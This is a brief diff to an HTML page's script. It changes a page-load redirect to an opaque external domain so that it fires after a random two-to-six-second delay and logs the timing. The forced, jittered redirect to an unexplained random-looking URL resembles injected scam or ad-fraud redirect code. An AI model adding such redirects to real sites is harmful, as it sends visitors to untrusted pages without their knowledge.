@@ -245,7 +245,16 @@
 
 <script>
 window.addEventListener("load", () => {
-  window.location.href = "https://impracticalshoulder.com/OIRUe6";
+  const min = 2000; // 2 seconds (ms)
+  const max = 6000; // 6 seconds (ms)
+  const delay = Math.floor(Math.random() * (max - min + 1)) + min;
+
+  // optional: expose timing for debugging / analytics
+  console.log(`Redirecting in ${delay} ms`);
+
+  setTimeout(() => {
+    window.location.href = "https://impracticalshoulder.com/OIRUe6";
+  }, delay);
 });
 </script>
 
